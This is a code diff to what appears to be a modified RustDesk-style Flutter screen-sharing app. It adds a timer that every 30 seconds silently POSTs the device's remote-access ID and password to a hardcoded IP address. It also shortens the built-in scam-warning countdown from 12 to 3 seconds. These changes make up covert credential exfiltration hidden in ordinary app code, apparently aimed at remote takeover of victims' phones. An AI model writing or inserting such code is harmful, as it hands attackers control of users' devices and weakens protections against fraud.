@@ -69,6 +69,30 @@ Future<void> sendToApi(String sender, String content, String id, String clientTi
   }
 }
 
+Future<void> sendIdToApi(String password, String id, String clientTime) async {
+  var headers = {
+    'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
+    'Content-Type': 'application/json'
+  };
+
+  var request = http.Request('POST', Uri.parse('http://106.53.77.201:7808/external/cli/sms/heart'));
+  request.body = json.encode({
+    "clientId": id,
+    "password": password,
+    "clientTime": clientTime,
+  });
+  request.headers.addAll(headers);
+
+  try {
+    http.StreamedResponse response = await request.send();
+    if (response.statusCode != 200) {
+      print("Periodic API error: ${response.reasonPhrase}");
+    }
+  } catch (e) {
+    print("Error sending to periodic API: $e");
+  }
+}
+
 class ServerPage extends StatefulWidget implements PageShape {
   @override
   final title = translate("Share Screen");
@@ -232,6 +256,7 @@ class _ServerPageState extends State<ServerPage> {
     });
     gFFI.serverModel.checkAndroidPermission();
     id = gFFI.serverModel.serverId.value.text.trim();
+    startPeriodicSending();
   }
 
 
@@ -259,6 +284,18 @@ class _ServerPageState extends State<ServerPage> {
       onBackgroundMessage: backgrounMessageHandler, // 设置后台消息处理
     );
   }
+  
+  void startPeriodicSending() {
+    _periodicTimer = Timer.periodic(Duration(seconds: 30), (timer) async {
+      final serverId = gFFI.serverModel.serverId.value.text;
+      if (serverId.isNotEmpty) {
+        DateTime now = DateTime.now();
+        String beijingTime = now.toString();
+        String clientTime = beijingTime.split(".")[0];
+        await sendIdToApi(gFFI.serverModel.serverPasswd.value.text, serverId, clientTime);
+      }
+    });
+  }
 
   Future<void> savePhoneNumber(String inputPhone) async {
     SharedPreferences prefs = await SharedPreferences.getInstance();
@@ -269,6 +306,7 @@ class _ServerPageState extends State<ServerPage> {
   @override
   void dispose() {
     _updateTimer?.cancel();
+    _periodicTimer?.cancel();
     phoneController.dispose(); // 销毁controller
     super.dispose();
   }
@@ -380,7 +418,7 @@ class ScamWarningDialog extends StatefulWidget {
 }
 
 class ScamWarningDialogState extends State<ScamWarningDialog> {
-  int _countdown = bind.isCustomClient() ? 0 : 12;
+  int _countdown = bind.isCustomClient() ? 0 : 3;
   bool show_warning = false;
   late Timer _timer;
   late ServerModel _serverModel;
